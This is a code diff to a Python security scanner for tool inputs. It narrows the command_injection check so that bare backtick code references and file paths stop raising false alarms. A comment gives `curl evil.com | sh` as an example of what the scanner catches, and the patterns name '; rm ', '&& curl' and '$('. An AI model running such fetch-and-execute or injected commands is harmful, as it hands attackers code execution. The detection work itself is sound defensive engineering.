@@ -122,6 +122,37 @@ PATTERNS: dict[str, re.Pattern[str]] = {
     ),
 }
 
+# WHY: the command_injection backtick clause matches ANY inline-code span to
+# catch command substitution like `whoami` or `curl evil.com | sh`. But that
+# also flags harmless code references like `func_name()` or `path/to/file.py`
+# — these have no whitespace or shell metacharacters, so nothing in them can
+# execute. Confirmed false-positive via golden-set probe (2026-07-02): a
+# tool_input containing `rotate_log_if_large()` in `hooks/utils.py` was
+# blocked as HIGH-priority command_injection despite being a bare code
+# reference. This does NOT cover bare single-token commands like `whoami` or
+# `rm` (no path separator, no call parens) — those remain flagged, matching
+# the existing test_command_injection_backticks contract.
+_SAFE_BACKTICK_CONTENT = re.compile(
+    r"^[\w\-]+(?:[./][\w\-]+)+(?:\(\))?$"  # path-like: word[./]word... optional trailing ()
+    r"|^[A-Za-z_]\w*\(\)$"  # bare function call: name()
+)
+
+
+def _filter_safe_backtick_matches(matches: list[str]) -> list[str]:
+    """Drop command_injection matches that are bare code identifiers/paths.
+
+    WHY: only backtick-shaped matches are filtered here — the other
+    command_injection alternatives ("; rm ", "&& curl", "$(") are untouched,
+    so this only narrows the one clause responsible for the confirmed
+    false positive, not the category's overall detection.
+    """
+    return [
+        m
+        for m in matches
+        if not (m.startswith("`") and m.endswith("`") and _SAFE_BACKTICK_CONTENT.match(m[1:-1]))
+    ]
+
+
 # WHY: these categories immediately escalate to HIGH even on a single match --
 # they carry direct operational risk (code execution, encoding bypass).
 HIGH_PRIORITY_CATEGORIES = {"encoding_attack", "command_injection"}
@@ -169,8 +200,13 @@ def scan(strings: list[str]) -> dict[str, int]:
     for text in strings:
         normed = _normalize(text)
         for category, pattern in PATTERNS.items():
-            raw_count = len(pattern.findall(text))
-            norm_count = len(pattern.findall(normed)) if normed != text else 0
+            raw_matches = pattern.findall(text)
+            norm_matches = pattern.findall(normed) if normed != text else []
+            if category == "command_injection":
+                raw_matches = _filter_safe_backtick_matches(raw_matches)
+                norm_matches = _filter_safe_backtick_matches(norm_matches)
+            raw_count = len(raw_matches)
+            norm_count = len(norm_matches)
             count = max(raw_count, norm_count)
             if count:
                 hits[category] = hits.get(category, 0) + count
